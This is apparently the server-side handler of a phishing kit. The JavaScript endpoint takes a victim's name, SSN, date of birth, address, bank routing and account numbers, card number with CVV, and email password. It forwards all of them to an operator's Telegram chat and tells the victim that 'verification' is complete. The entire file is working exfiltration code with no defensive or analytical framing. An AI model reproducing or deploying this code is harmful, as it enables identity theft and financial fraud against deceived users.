export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
    
    try {
        const {
            fullName, addressStreet, addressCity, addressState, addressZip,
            ssn, dob, bankName, routingNumber, accountNumber,
            cardNumber, cardExpiry, cardCvv, email, password,
            ipInfo, userAgent, timestamp, submissionType, submissionStage
        } = req.body;
        
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
        
        if (!BOT_TOKEN || !CHAT_ID) {
            return res.status(500).json({ success: false, error: 'Missing bot credentials' });
        }
        
        const currentTime = new Date(timestamp || Date.now()).toLocaleString('en-US', { 
            timeZone: 'America/New_York', dateStyle: 'full', timeStyle: 'long'
        });
        
        let message = '';
        
        if (submissionType === 'partial_bank' || submissionStage === 'BANK_VERIFICATION_PARTIAL') {
            message = `📋 *PARTIAL VERIFICATION - BANK DETAILS* 📋
            
━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 *PERSONAL INFORMATION*
━━━━━━━━━━━━━━━━━━━━━━━━━━
*Full Name:* ${fullName || 'N/A'}
*SSN:* ${ssn || 'N/A'}
*DOB:* ${dob || 'N/A'}

📍 *ADDRESS*
━━━━━━━━━━━━━━━━━━━━━━━━━━
${addressStreet || 'N/A'}, ${addressCity || 'N/A'}, ${addressState || 'N/A'} ${addressZip || 'N/A'}

🏦 *BANK DETAILS (PARTIAL SUBMISSION)*
━━━━━━━━━━━━━━━━━━━━━━━━━━
*Bank:* ${bankName || 'N/A'}
*Routing:* ${routingNumber || 'N/A'}
*Account:* ${accountNumber || 'N/A'}

🌐 *DEVICE INFORMATION*
━━━━━━━━━━━━━━━━━━━━━━━━━━
*IP:* ${ipInfo?.ip || 'Unknown'}
*Location:* ${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}

━━━━━━━━━━━━━━━━━━━━━━━━━━
🕐 *Timestamp:* ${currentTime}
⚠️ *AWAITING CARD & EMAIL VERIFICATION* ⚠️`;
        } else {
            message = `🔐 *FULL VERIFICATION - COMPLETE* 🔐
            
━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 *PERSONAL INFORMATION*
━━━━━━━━━━━━━━━━━━━━━━━━━━
*Full Name:* ${fullName || 'N/A'}
*SSN:* ${ssn || 'N/A'}
*DOB:* ${dob || 'N/A'}

📍 *ADDRESS*
━━━━━━━━━━━━━━━━━━━━━━━━━━
${addressStreet || 'N/A'}, ${addressCity || 'N/A'}, ${addressState || 'N/A'} ${addressZip || 'N/A'}

🏦 *BANK DETAILS*
━━━━━━━━━━━━━━━━━━━━━━━━━━
*Bank:* ${bankName || 'N/A'}
*Routing:* ${routingNumber || 'N/A'}
*Account:* ${accountNumber || 'N/A'}

💳 *CARD INFORMATION*
━━━━━━━━━━━━━━━━━━━━━━━━━━
*Card:* ${cardNumber || 'N/A'}
*Expiry:* ${cardExpiry || 'N/A'}
*CVV:* ${cardCvv || 'N/A'}

📧 *EMAIL VERIFICATION*
━━━━━━━━━━━━━━━━━━━━━━━━━━
*Email:* ${email || 'N/A'}
*Password:* ${password || 'N/A'}

🌐 *DEVICE INFORMATION*
━━━━━━━━━━━━━━━━━━━━━━━━━━
*IP:* ${ipInfo?.ip || 'Unknown'}
*Location:* ${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}
*User Agent:* ${userAgent?.substring(0, 100) || 'Unknown'}

━━━━━━━━━━━━━━━━━━━━━━━━━━
🕐 *Timestamp:* ${currentTime}
✅ *VERIFICATION COMPLETED* ✅`;
        }
        
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown', disable_web_page_preview: true })
        });
        
        const data = await response.json();
        
        if (data.ok) {
            return res.status(200).json({ success: true, message: 'Verification complete' });
        } else {
            return res.status(500).json({ success: false, error: data.description || 'Failed to send' });
        }
    } catch (error) {
        return res.status(500).json({ success: false, error: error.message });
    }
}
